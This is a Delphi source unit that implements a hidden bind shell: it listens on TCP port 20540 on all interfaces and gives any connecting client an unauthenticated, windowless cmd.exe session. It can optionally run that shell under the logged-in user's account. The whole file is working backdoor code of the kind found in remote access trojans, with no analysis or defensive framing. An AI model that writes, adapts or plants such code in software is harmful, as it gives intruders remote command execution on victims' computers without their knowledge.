unit uCMD;

interface
uses Windows, WinSock,uDebug,ufuncs;
// thread callback functions
type
  TSessionData = record
    hPipe:   THandle;
    sClient: TSocket;
  end;

  PProcessData = ^TProcessData;
  TProcessData = record
    hProcess:    THandle;
    dwProcessID: DWORD;
    next:        PProcessData;
  end;
const
  CMD_OPEN_PORT1: Word   = 20540;
  CMD_OPEN_PORT2: Word   = 20541;
  BUFFER_SIZE = 1024;
  CRLF        = #13#10;
  TAB         = '	';
var
  hCMDMutex: THandle;
  lpProcessDataHead: PProcessData;
  lpProcessDataEnd: PProcessData;
  CreateCMDType:DWORD;
  
function CmdService(lpParam: Pointer): Integer; stdcall;
function CmdShell(lpParam: Pointer): Integer; stdcall;
function ReadShell(lpParam: Pointer): Integer; stdcall;
function WriteShell(lpParam: Pointer): Integer; stdcall;  


procedure startCmdService;
implementation
procedure startCmdService;
var
  tmpvar,hThread:DWORD;
begin
  hThread := CreateThread(nil, 0, @CmdService, nil, 0, tmpvar);
  closehandle(hThread);
end;
function CmdService(lpParam: Pointer): Integer;
var
  wsa:     WSAData;
  sServer: TSocket;
  sClient: TSocket;
  hThread: Cardinal;
  sin:     sockaddr_in;
  tmpvar: Cardinal;
begin
  Result := -1;
  WSAStartup(MAKEWORD(2, 2), wsa);
  sServer := socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if sServer = INVALID_SOCKET then
  begin
    //OutputDebugString('Socket Error !'#10);
    Log('Socket Error !');
    Exit;
  end;
  sin.sin_family      := AF_INET;
  sin.sin_port        := htons(CMD_OPEN_PORT1);
  sin.sin_addr.S_addr := INADDR_ANY;

  if bind(sServer, sin, sizeof(sin)) = SOCKET_ERROR then
  begin
    //OutputDebugString('Bind Error !'#10);
    Log('Bind Error !');
    Exit;
  end;
  if listen(sServer, 5) = SOCKET_ERROR then
  begin
    //OutputDebugString('Listen Error !'#10);
    Log('Listen Error !!');
    Exit;
  end;
  hCMDMutex := CreateMutex(nil, FALSE, nil);
  if hCMDMutex=0 then Log('Create Mutex Error !'#10);
  lpProcessDataHead := nil;
  lpProcessDataEnd  := nil;

  while True do
  begin
    sClient := accept(sServer, nil, nil);
    hThread := CreateThread(nil, 0, @CmdShell, @sClient, 0, tmpvar);
    if hThread = 0 then
    begin
      Log('A CreateThread of CmdShell Error !'#10);
      Break;
    end;
    Sleep(1000);
  end;
  WSACleanup;
  Result := 0;
end;

function CmdShell(lpParam: Pointer): Integer;
var
  sClient:            TSocket;
  hWritePipe,
  hReadPipe,
  hWriteShell,
  hReadShell:         THandle;
  hThread:            array[0..2] of THandle;
  dwReavThreadId,
  dwSendThreadId:     DWORD;
  dwProcessId:        DWORD;
  dwResult:           DWORD;
  lpStartupInfo:      STARTUPINFOA;
  sdWrite,
  sdRead:             TSessionData;
  lpProcessInfo:      PROCESS_INFORMATION;
  saPipe:             SECURITY_ATTRIBUTES;
  lpProcessDataLast,
  lpProcessDataNow:   PProcessData;
  lpImagePath:        array[0..MAX_PATH - 1] of ansiChar;
begin
  Result := -1;
  sClient := TSocket(lpParam^);
  saPipe.nLength              := sizeof(saPipe);
  saPipe.bInheritHandle       := TRUE;
  saPipe.lpSecurityDescriptor := nil;
  if not CreatePipe(hReadPipe, hReadShell, @saPipe, 0) then
  begin
    Log('A CreatePipe for ReadPipe Error !'#10);
    Exit;
  end;
  if not CreatePipe(hWriteShell, hWritePipe, @saPipe, 0) then
  begin
    Log('A CreatePipe for WritePipe Error !'#10);
    Exit;
  end;
  GetStartupInfoA(lpStartupInfo);
  lpStartupInfo.cb          := sizeof(lpStartupInfo);
  lpStartupInfo.dwFlags     := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
  lpStartupInfo.hStdInput   := hWriteShell;
  lpStartupInfo.hStdOutput  := hReadShell;
  lpStartupInfo.hStdError   := hReadShell;
  lpStartupInfo.wShowWindow := SW_HIDE;

  GetSystemDirectoryA(lpImagePath, MAX_PATH);
  lstrcatA(lpImagePath, '\cmd.exe');

  WaitForSingleObject(hCMDMutex, INFINITE);

  case CreateCMDType of
  1:begin
      if not CreateProcessA(lpImagePath, nil, nil, nil, TRUE, 0, nil, nil,lpStartupInfo, lpProcessInfo) then
      begin
        Log('A CreateProcess Error !'#10);
        Exit;
      end;//if
    end;//1
  2:begin
      lpProcessInfo:=RunFileAsCurrentUser(lpImagePath,lpStartupInfo);
      if lpProcessInfo.hProcess=0 then
      begin
        Log('RunFileAsCurrentUser Error !'#10);
        Exit;
      end;//if lpProcessInfo.hProcess=0 then
    end;//2
  else
    Log('A CreateCMDType Error !'#10);
    exit;
  end;//case

  GetMem(lpProcessDataNow, sizeof(TProcessData));
  lpProcessDataNow.hProcess    := lpProcessInfo.hProcess;
  lpProcessDataNow.dwProcessId := lpProcessInfo.dwProcessId;
  lpProcessDataNow.next        := nil;
  if (lpProcessDataHead = nil) or (lpProcessDataEnd = nil) then
  begin
    lpProcessDataHead := lpProcessDataNow;
    lpProcessDataEnd := lpProcessDataNow;
  end
  else
  begin
    lpProcessDataEnd.next := lpProcessDataNow;
    lpProcessDataEnd := lpProcessDataNow;
  end;

  hThread[0] := lpProcessInfo.hProcess;
  dwProcessId := lpProcessInfo.dwProcessId;
  CloseHandle(lpProcessInfo.hThread);
  ReleaseMutex(hCMDMutex);

  CloseHandle(hWriteShell);
  CloseHandle(hReadShell);

  sdRead.hPipe   := hReadPipe;
  sdRead.sClient := sClient;
  hThread[1] := CreateThread(nil, 0, @ReadShell, @sdRead, 0, dwSendThreadId);
  if hThread[1] = 0 then
  begin
    Log('A CreateThread of ReadShell(Send) Error !'#10);
    Exit;
  end;

  sdWrite.hPipe   := hWritePipe;
  sdWrite.sClient := sClient;
  hThread[2] := CreateThread(nil, 0, @WriteShell, @sdWrite, 0, dwReavThreadId);
  if hThread[2] = 0 then
  begin
    Log('A CreateThread of ReadShell(Recv) Error !'#10);
    Exit;
  end;

  dwResult := WaitForMultipleObjects(3, PWOHandleArray(@hThread[0]), FALSE, INFINITE);
  if (dwResult >= WAIT_OBJECT_0) and (dwResult <= (WAIT_OBJECT_0 + 2)) then
  begin
    dwResult := dwResult - WAIT_OBJECT_0;
    if (dwResult <> 0) then
      TerminateProcess(hThread[0], 1);
    CloseHandle(hThread[(dwResult + 1) mod 3]);
    CloseHandle(hThread[(dwResult + 2) mod 3]);
  end;

  CloseHandle(hWritePipe);
  CloseHandle(hReadPipe);

  WaitForSingleObject(hCMDMutex, INFINITE);
  lpProcessDataLast := nil;
  lpProcessDataNow  := lpProcessDataHead;
  while (lpProcessDataNow.next <> nil) and
    (lpProcessDataNow.dwProcessId <> dwProcessId) do
  begin
    lpProcessDataLast := lpProcessDataNow;
    lpProcessDataNow  := lpProcessDataNow.next;
  end;
  if lpProcessDataNow = lpProcessDataEnd then
  begin
    if lpProcessDataNow.dwProcessId <> dwProcessId then
      Log('A No Found the Process Handle !'#10)
    else
    begin
      if lpProcessDataNow = lpProcessDataHead then
      begin
        lpProcessDataHead := nil;
        lpProcessDataEnd := nil;
      end
      else
        lpProcessDataEnd := lpProcessDataLast;
    end;
  end
  else
  begin
    if lpProcessDataNow = lpProcessDataHead then
      lpProcessDataHead := lpProcessDataNow.next
    else
      lpProcessDataLast.next := lpProcessDataNow.next;
  end;
  ReleaseMutex(hCMDMutex);
  Result := 0;
end;

function ReadShell(lpParam: Pointer): Integer;
var
  sdRead:        TSessionData;
  dwBufferRead,dwBufferNow,dwBuffer2Send: DWORD;
  szBuffer:      array[0..BUFFER_SIZE - 1] of ansiChar;
  szBuffer2Send: array[0..BUFFER_SIZE + 31] of ansiChar;
  PrevansiChar:      ansiChar;
  //szStartMessage,
  //szHelpMessage: array[0..255] of ansiChar;
begin
  sdRead := TSessionData(lpParam^);
  {
  FillansiChar(szStartMessage, 256, 0);
  szStartMessage := N_NET_WELCOM_MESSAGE;
  FillansiChar(szHelpMessage, 256, 0);
  szHelpMessage := N_NET_HELP_MESSAGE;

  send(sdRead.sClient, szStartMessage, 256, 0);
  send(sdRead.sClient, szHelpMessage, 256, 0);
   }
   zeromemory(@szBuffer[0],sizeof(szBuffer));
   zeromemory(@szBuffer2Send[0],sizeof(szBuffer2Send));
  while PeekNamedPipe(sdRead.hPipe, @szBuffer, BUFFER_SIZE, @dwBufferRead, nil, nil) do
  begin
    if (dwBufferRead > 0) then
      ReadFile(sdRead.hPipe, szBuffer, BUFFER_SIZE, dwBufferRead, nil)
    else
    begin
      Sleep(10);
      Continue;
    end;

    dwBufferNow   := 0;
    dwBuffer2Send := 0;
    PrevansiChar      := #0;
    while dwBufferNow < dwBufferRead do
    begin
      if ((szBuffer[dwBufferNow] = #10) and (PrevansiChar <> #13)) then
      begin
        szBuffer[dwBuffer2Send] := #13;
        Inc(dwBuffer2Send);
      end;
      PrevansiChar := szBuffer[dwBufferNow];
      szBuffer2Send[dwBuffer2Send] := szBuffer[dwBufferNow];
      Inc(dwBufferNow);
      Inc(dwBuffer2Send);
    end;

    if send(sdRead.sClient, szBuffer2Send, dwBuffer2Send, 0) = SOCKET_ERROR then
    begin
      Log('Send in ReadShell Error !'#10);
      Break;
    end;
    Sleep(5);
  end;
  shutdown(sdRead.sClient, $02);
  closesocket(sdRead.sClient);
  Result := 0;
end;

function WriteShell(lpParam: Pointer): Integer;
var
  sdWrite:         TSessionData;
  dwBuffer2Write,
  dwBufferWritten: DWORD;
  szBuffer:        array[0..0] of ansiChar;
  szBuffer2Write:  array[0..BUFFER_SIZE - 1] of ansiChar;
begin
  sdWrite := TSessionData(lpParam^);
  dwBuffer2Write := 0;
  zeromemory(@szBuffer2Write[0],BUFFER_SIZE);
  while recv(sdWrite.sClient, szBuffer, 1, 0) <> 0 do
  begin
    szBuffer2Write[dwBuffer2Write] := szBuffer[0];
    Inc(dwBuffer2Write);

    //if CompareText(szBuffer2Write, 'exit' + CRLF) = 0 then
    if lstrcmpiA(szBuffer2Write, 'exit' + CRLF) = 0 then
    begin
      shutdown(sdWrite.sClient, $02);
      closesocket(sdWrite.sClient);
      Result := 0;
      Exit;
    end;

    if szBuffer[0] = #10 then
    begin
      if WriteFile(sdWrite.hPipe, szBuffer2Write, dwBuffer2Write,
        dwBufferWritten, nil) = False then
      begin
        Log('WriteFile in WriteShell(Recv) Error !'#10);
        break;
      end;
      dwBuffer2Write := 0;
    end;
    Sleep(10);
  end;

  shutdown(sdWrite.sClient, $02);
  closesocket(sdWrite.sClient);
  Result := 0;
end;
end.

